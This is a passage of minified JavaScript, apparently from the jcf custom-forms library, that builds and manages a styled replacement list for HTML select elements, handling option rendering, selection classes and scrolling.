s=this,i=this.element[0];this.storedSelectHTML=i.innerHTML,this.optionIndex=0,this.list=t(this.createOptionsList(i)),this.listHolder.empty().append(this.list),this.realOptions=this.element.find("option"),this.fakeOptions=this.list.find(this.indexSelector),this.fakeListItems=this.list.find("."+this.options.captionClass+","+this.indexSelector),delete this.optionIndex;var o=this.options.maxVisibleItems,n=this.element.prop("size");n>1&&!this.element.is("[jcf-size]")&&(o=n);var l=this.fakeOptions.length>o;return this.container.toggleClass(this.options.scrollClass,l),l&&(this.listHolder.css({maxHeight:this.getOverflowHeight(o),overflow:"auto"}),this.options.useCustomScroll&&e.modules.Scrollable)?void e.replace(this.listHolder,"Scrollable",{handleResize:this.options.handleResize,alwaysPreventMouseWheel:this.options.alwaysPreventMouseWheel}):void(this.options.alwaysPreventMouseWheel&&(this.preventWheelHandler=function(e){var t=s.listHolder.scrollTop(),i=s.listHolder.prop("scrollHeight")-s.listHolder.innerHeight();(0>=t&&e.deltaY<0||t>=i&&e.deltaY>0)&&e.preventDefault()},this.listHolder.on("jcf-mousewheel",this.preventWheelHandler)))},refreshSelectedClass:function(){var e,t=this,s=this.element.prop("multiple"),i=this.element.prop("selectedIndex");s?this.realOptions.each(function(e,s){t.fakeOptions.eq(e).toggleClass(t.options.selectedClass,!!s.selected)}):(this.fakeOptions.removeClass(this.options.selectedClass+" "+this.options.hoverClass),e=this.fakeOptions.eq(i).addClass(this.options.selectedClass),this.options.useHoverClass&&e.addClass(this.options.hoverClass))},scrollToActiveOption:function(){var e=this.getActiveOptionOffset();"number"==typeof e&&this.listHolder.prop("scrollTop",e)},getSelectedOptionsIndexes:function(){var e=[];return this.realOptions.each(function(t,s){s.selected&&e.push(t)}),e},getChangedSelectedIndex:function(){var e=this.element.prop("selectedIndex"),s=this,i=!1,o=null;return this.element.prop("multiple")?(this.currentSelection=this.getSelectedOptionsIndexes(),t.each(this.currentSelection,function(e,t){!i&&s.previousSelection.indexOf(t)<0&&(0===e&&(i=!0),o=t)}),this.previousSelection=this.currentSelection,o):e},getActiveOptionOffset:function(){var e=this.getChangedSelectedIndex();if(null!==e){var t=this.listHolder.height(),s=this.listHolder.prop("scrollTop"),i=this.fakeOptions.eq(e),o=i.offset().top-this.list.offset().top,n=i.innerHeight();return o+n>=s+t?o-t+n:s>o?o:void 0}},getOverflowHeight:function(e){var t=this.fakeListItems.eq(e-1),s=this.list.offset().top,i=t.offset().top,o=t.innerHeight();return i+o-s},getScrollTop:function(){return this.listHolder.scrollTop()},setScrollTop:function(e){this.listHolder.scrollTop(e)},createOption:function(e){var t=document.createElement("span");t.className=this.options.optionClass,t.innerHTML=e.innerHTML,t.setAttribute(this.options.indexAttribute,this.optionIndex++);var s,i=e.getAttribute("data-image");return i&&(s=document.createElement("img"),s.src=i,t.insertBefore(s,t.childNodes[0])),e.disabled&&(t.className+=" "+this.options.disabledClass),e.className&&(t.className+=" "+r(e.className,this.options.cloneClassPrefix)),t},createOptGroup:function(e){var t,s,i=document.createElement("span"),o=e.getAttribute("label");return t=document.createElement("span"),t.className=this.options.captionClass,t.innerHTML=o,i.appendChild(t),e.children.length&&(s=this.createOptionsList(e),i.appendChild(s)),i.className=this.options.groupClass,i},createOptionContainer:function(){var e=document.createElement("li");return e},createOptionsList:function(e){var s=this,i=document.createElement("ul");return t.each(e.children,function(e,t){var o,n=s.createOptionContainer(t);switch(t.tagName.toLowerCase()){case"option":o=s.createOption(t);break;case"optgroup":o=s.createOptGroup(t)}i.appendChild(n).appendChild(o)}),i},refresh:function(){this.storedSelectHTML!==this.element.prop("innerHTML")&&this.rebuildList();var t=e.getInstance(this.listHolder);t&&t.refresh(),this.refreshSelectedClass()},destroy:function(){this.listHolder.off("jcf-mousewheel",this.preventWheelHandler),this.listHolder.off("jcf-pointerdown",this.indexSelector,this.onSelectItem),this.listHolder.off("jcf-pointerover",this.indexSelector,this.onHoverItem),this.listHolder.off("jcf-pointerdown",this.onPress)}});var r=function(e,t){return e?e.replace(/[\s]*([\S]+)+[\s]*/gi,t+"$1 "):""},h=function(){function t(e){e.preventDefault()}var s=e.getOptions().unselectableClass;return function(e){e.addClass(s).on("selectstart",t)}}();return l})}(jcf);